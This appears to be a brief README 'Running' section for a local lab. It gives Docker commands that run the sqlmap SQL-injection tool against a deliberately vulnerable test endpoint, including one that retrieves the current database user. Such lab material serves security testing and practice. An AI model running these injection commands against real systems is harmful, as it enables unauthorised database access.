Running
=======

```
$ make
$ docker run --rm -ti -v $PWD:/data --network target-compose_default sqlmap --dbms postgresql -u 'http://web:3000/api/vulnerable?id=12345'
$ docker run --rm -ti -v $PWD:/data --network target-compose_default sqlmap --dbms postgresql -u 'http://web:3000/api/vulnerable?id=12345' --current-user
```

This will create a session directory called web in your current directory.
